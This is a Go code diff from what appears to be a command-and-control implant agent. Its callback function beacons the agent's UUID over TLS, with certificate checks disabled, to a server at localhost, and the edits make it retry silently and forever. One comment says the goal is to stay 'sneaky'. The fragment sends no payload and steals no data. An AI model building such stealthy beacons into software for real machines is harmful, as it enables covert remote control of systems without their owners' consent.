@@ -35,36 +35,43 @@ type agentInfoStruct struct {
 }
 
 var (
-	serverPublicKey string          = "555"
-	agentUUID       uuid.UUID       = uuid.New()
-	agentInfo       agentInfoStruct = agentInfoStruct{ServerPublicKey: serverPublicKey, AgentUUID: agentUUID}
-	localPort       int             = 1337
-	//localAddress    net.TCPAddr     = net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: localPort}
-	localAddress      net.TCPAddr   = net.TCPAddr{Port: localPort}
+	serverPublicKey string = "555"
+	// TODO: Change agentUUID back to a proper value
+	//agentUUID uuid.UUID = uuid.New()
+	agentUUID, _                 = uuid.Parse("76b8a692-f7be-4f51-b72a-86244a66e680")
+	agentInfo    agentInfoStruct = agentInfoStruct{ServerPublicKey: serverPublicKey, AgentUUID: agentUUID}
+	localPort    int             = 1337
+	localAddress net.TCPAddr     = net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: localPort}
+	//localAddress      net.TCPAddr   = net.TCPAddr{Port: localPort}
 	serverIP          string        = "127.0.0.1"
 	serverPort        int           = 444
 	serverAddress     net.TCPAddr   = net.TCPAddr{IP: net.ParseIP(serverIP), Port: serverPort}
 	tlsConfig         tls.Config    = tls.Config{InsecureSkipVerify: true}
-	waitTimeInMinutes time.Duration = time.Minute * 1
+	waitTimeInMinutes time.Duration = 2 * time.Minute
 )
 
 func callback() {
+	// All errors just `return` instead of erroring since we want to keep trying, infinitely
+
 	// TODO: Allow for custom local port to be specified, currently unsure how to do this.
 	//       Can do it with net.Dial(), but there's no option in tls.Dial()...
 	conn, err := tls.Dial("tcp", serverIP+":"+fmt.Sprint(serverPort), &tlsConfig)
 	//conn, err := net.DialTCP("tcp", &localAddress, &serverAddress)
 	if err != nil {
-		os.Exit(utils.ERR_CONNECTION) // we don't want to output anything if we're trying to be sneaky
+		return // we can't connect, but that's fine, try again next time (and the next time, and the next time, and the...)
 	}
 
-	_ = conn.SetWriteDeadline(time.Now().Add(time.Second * 1))
+	err = conn.SetWriteDeadline(time.Now().Add(time.Second * 1))
+	if err != nil { // ignore this strange error
+		return
+	}
 
 	callbackMessage := agentUUID.String()
 	numBytes, err := conn.Write([]byte(callbackMessage))
 	if err != nil { // couldn't establish connection?
-		os.Exit(utils.ERR_WRITE)
+		return
 	} else if numBytes == 0 { // somehow wasn't able to send any data
-		os.Exit(utils.ERR_BYTES)
+		return
 	}
 }
 
